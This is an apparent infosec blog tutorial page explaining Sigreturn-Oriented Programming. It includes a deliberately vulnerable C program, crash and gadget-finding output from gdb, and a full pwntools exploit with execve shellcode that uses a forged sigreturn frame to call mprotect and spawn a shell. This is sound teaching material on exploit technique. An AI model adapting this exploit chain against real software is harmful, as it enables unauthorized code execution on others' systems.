@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="description" content="">
+    <meta property="og:title" content="Sigreturn-Oriented Programming (SROP)">
+    
+    <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2018-11-04">
+    
+    <meta property="og:description" content="">
+    <meta property="og:url" content="https://amriunix.com/post/sigreturn-oriented-programming-srop/">
+    <meta property="og:site_name" content="InfoSec Blog">
+    
+    <meta property="og:tags" content="exploit">
+    
+    <meta property="og:tags" content="srop">
+    
+    <meta property="og:tags" content="linux">
+    
+    <meta name="generator" content="Hugo 0.50" />
+    <title>Sigreturn-Oriented Programming (SROP)</title>
+    
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/default.min.css">
+    
+    <link rel="stylesheet" href="https://amriunix.com/css/style.css">
+    
+    <link href="https://amriunix.com/index.xml" rel="alternate" type="application/rss+xml" title="InfoSec Blog" />
+    
+    
+    <link rel="icon" href="https://amriunix.com/favicon.ico" />
+    
+
+    
+    
+</head>
+<body>
+
+<nav class="navbar navbar-default navbar-fixed-top visible-xs">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+				<a class="navbar-brand" href="https://amriunix.com/">AMRIUNIX</a>
+			
+		</div>
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				
+				
+					<li><a href="https://amriunix.com/">Home</a></li>
+				
+					<li><a href="https://amriunix.com/post/">Posts</a></li>
+				
+					<li><a href="https://amriunix.com/about">About</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</nav>
+<div class="container-fluid">
+	<div class="row">
+		<div id="menu" class="hidden-xs col-sm-4 col-md-3">
+	<div id="menu-content" class="vertical-align">
+		
+			<h1 class="text-center"><a href="https://amriunix.com/">AMRIUNIX</a></h1>
+		
+		
+		
+			<small class="text-center center-block">OUSSAMA AMRI</small>
+		
+		
+		
+			<img id="profile-pic" src="https://amriunix.com//img/amriunix.png" alt="My Picture" class="img-circle center-block">
+		
+		<div id="social" class="text-center">
+			
+				<a href="https://github.com/amriunix"><i class="fa fa-github fa-2x"></i></a>
+			
+				<a href="https://twitter.com/amriunix"><i class="fa fa-twitter fa-2x"></i></a>
+			
+				<a href="https://www.linkedin.com/in/amriunix/"><i class="fa fa-linkedin fa-2x"></i></a>
+			
+
+			<a href="mailto:oussama[at]amriunix.com"><i class="fa fa-envelope-o fa-2x"></i></a>
+		</div>
+		<div id="links" class="text-center">
+			
+			
+				<a href="https://amriunix.com/">Home</a>
+			
+				<a href="https://amriunix.com/post/">Posts</a>
+			
+				<a href="https://amriunix.com/about">About</a>
+			
+		</div>
+	</div>
+</div>
+
+		<div id="content" class="col-xs-12 col-sm-8 col-md-9">
+			<div class="row">
+				<div id="post" class="col-sm-offset-1 col-sm-10 col-md-10 col-lg-10">
+
+
+<main>
+	<header>
+		<h1>Sigreturn-Oriented Programming (SROP)</h1>
+	</header>
+
+	<article>
+		<p>Sigreturn-oriented programming (SROP) is a exploit development technique used to execute code, this attack employs the same basic assumptions behind the return-oriented programming (ROP) technique.</p>
+
+<p></p>
+
+<h3 id="tl-dr">TL;DR</h3>
+
+<p>When a signal occurs, the kernel “pauses” the process’s execution in order to jump to a signal handler routine. In order to safely resume the execution after the handler, the context of that process is pushed/saved on the stack (registers, flags, instruction pointer, stack pointer etc). When the handler is finished, <code>sigreturn()</code> is being called which will restore the context of the process by popping the values off of the stack. That’s what is being exploited in that technique.</p>
+
+<h3 id="differences-from-rop">Differences from ROP</h3>
+
+<p>SROP exploits are usually portable across different binaries with minimal or no effort and allow easily setting the contents of the registers, which could be non-trivial or unfeasible for ROP exploits if the needed gadgets are not present. Moreover, SROP requires a minimal number of gadgets (ROP) and allows constructing effective shellcodes by chaining system calls.</p>
+
+<h3 id="sigcontext-structure">Sigcontext Structure</h3>
+
+<p>The attack works by putting on the call stack a forged <code>sigcontext structure</code> and then overwriting the return address with the location of a gadget that allows the attacker to call the <code>sigreturn()</code>
+<figure>
+    <img src="../../img/Sigreturn-oriented-programming-SROP/sigcontext_structure.jpg" width="60%"/> 
+</figure>
+</p>
+
+<blockquote>
+<p>The sigcontext structure length is 248 Bytes, ignore the first 8 Byte <code>rt_sigreturn()</code></p>
+</blockquote>
+
+<h3 id="attacks">Attacks</h3>
+
+<h4 id="rop-gadget">ROP Gadget</h4>
+
+<p>In order to achieve this attack we need first ROP gadgets to do :</p>
+
+<pre><code class="language-assembly"># x64
+mov eax, 0x0f; syscall; ret
+
+# x86
+mov eax, 0x77; int 0x80; ret
+
+</code></pre>
+
+<h4 id="example-srop-c">Example : srop.c</h4>
+
+<p>This is our example to perform SROP attack.</p>
+
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+// gcc srop.c -o srop -no-pie -fno-stack-protector
+void syscall_(){
+       __asm__(&quot;syscall; ret;&quot;);
+}
+
+void set_rax(){
+       __asm__(&quot;movl $0xf, %eax; ret;&quot;);
+}
+
+int main(){
+       // ONLY SROP!
+       char buff[100];
+       printf(&quot;Buff @%p, can you SROP?\n&quot;, buff);
+       read(0, buff, 5000);
+       return 0;
+}
+</code></pre>
+
+<h4 id="finding-the-crash">Finding The Crash</h4>
+
+<pre><code class="language-shell">root@kali:~/srop# python -c 'print &quot;A&quot; * 120 + &quot;BBBB&quot;' | ./srop
+Buff @0x7fff7f78eb30, can you SROP?
+Segmentation fault
+
+root@kali:~/srop# dmesg | tail
+[  258.498005] IPv6: ADDRCONF(NETDEV_CHANGE): eth0: link becomes ready
+[  264.546090] e1000: eth0 NIC Link is Down
+[  268.579755] e1000: eth0 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: None
+[ 2196.793909] srop[2120]: segfault at 7f0a42424242 ip 00007f0a42424242 sp 00007fff7f78ebb0 error 14
+
+</code></pre>
+
+<p>As we can see the rip offset to overwrite will be at 120.</p>
+
+<h4 id="finding-gadgets">Finding Gadgets</h4>
+
+<pre><code class="language-shell">root@kali:~/srop# gdb ./srop -q
+Reading symbols from ./srop...(no debugging symbols found)...done.
+gdb-peda$ disassemble syscall_
+Dump of assembler code for function syscall_:
+   0x0000000000401132 &lt;+0&gt;:     push   rbp
+   0x0000000000401133 &lt;+1&gt;:     mov    rbp,rsp
+   0x0000000000401136 &lt;+4&gt;:     syscall
+   0x0000000000401138 &lt;+6&gt;:     ret    
+   0x0000000000401139 &lt;+7&gt;:     nop
+   0x000000000040113a &lt;+8&gt;:     pop    rbp
+   0x000000000040113b &lt;+9&gt;:     ret    
+End of assembler dump.
+gdb-peda$ disassemble set_rax
+Dump of assembler code for function set_rax:
+   0x000000000040113c &lt;+0&gt;:     push   rbp
+   0x000000000040113d &lt;+1&gt;:     mov    rbp,rsp
+   0x0000000000401140 &lt;+4&gt;:     mov    eax,0xf
+   0x0000000000401145 &lt;+9&gt;:     ret    
+   0x0000000000401146 &lt;+10&gt;:    nop
+   0x0000000000401147 &lt;+11&gt;:    pop    rbp
+   0x0000000000401148 &lt;+12&gt;:    ret    
+End of assembler dump.
+gdb-peda$
+
+</code></pre>
+
+<p>As we can see we have what we want to setup the stack for Sigreturn() syscall.</p>
+
+<h4 id="exploit">Exploit</h4>
+
+<pre><code class="language-python">#!/usr/bin/python
+from pwn import *
+
+context.clear(arch=&quot;amd64&quot;)
+p = process(&quot;./srop&quot;)
+
+# ENTRIES : ROP gadgets
+syscall_ret = 0x0401136
+mov_rax_15_ret = 0x0401140
+shellcode = &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
+
+# Leak
+buff_leak = p.recv()
+stack_leak = buff_leak[6:17] + &quot;000&quot;
+stack_addr = int(stack_leak, 16)
+shellcode_addr = int(buff_leak[6:20], 16)
+p.info(&quot;Stack at : &quot; + str(hex(stack_addr)))
+p.info(&quot;Shellcode at : &quot; + str(hex(shellcode_addr)))
+
+# Exploit
+payload = shellcode
+payload += &quot;A&quot; * (120-len(shellcode))
+payload += p64(mov_rax_15_ret)
+payload += p64(syscall_ret)
+
+frame = SigreturnFrame(kernel=&quot;amd64&quot;) # CREATING A SIGRETURN FRAME
+frame.rax = 10 # MPROTECT SYSCALL
+frame.rdi = stack_addr # base address
+frame.rsi = 1000 # size
+frame.rdx = 7 # SET RDX =&gt; RWX PERMISSION
+frame.rsp = shellcode_addr + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME!
+frame.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS
+payload += str(frame)
+payload += p64(shellcode_addr) # WHERE IT GOING TO RETURN ( shellcode )
+
+# Sending Payload
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+
+<blockquote>
+<p>Please leave comments bellow if you have any additional information or any question ?</p>
+</blockquote>
+
+<h4 id="download">Download:</h4>
+
+<ul>
+<li><a href="../../files/Sigreturn-oriented-programming-SROP/srop.zip">srop.zip</a></li>
+</ul>
+
+<h4 id="sources">Sources:</h4>
+
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Sigreturn-oriented_programming">wikipedia</a></li>
+<li><a href="https://0x00sec.org/t/srop-signals-you-say/2890">0x00sec</a>
+</br></li>
+</ul>
+	</article>
+</main>
+
+<div id="bottom-nav" class="text-center center-block">
+	<a href=" https://amriunix.com/" class="btn btn-default"><i class="fa fa-home"></i> Home</a>
+</div>
+
+
+  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "amriunix" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+  </div>
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-51953135-2', 'auto');
+    ga('send', 'pageview');
+    window.baseURL = "https:\/\/amriunix.com\/";
+  </script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.2/js/bootstrap.min.js"></script>
+  
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
+  
+  <script src="https://amriunix.com//js/App.js"></script>
+  
+</body>
+</html>
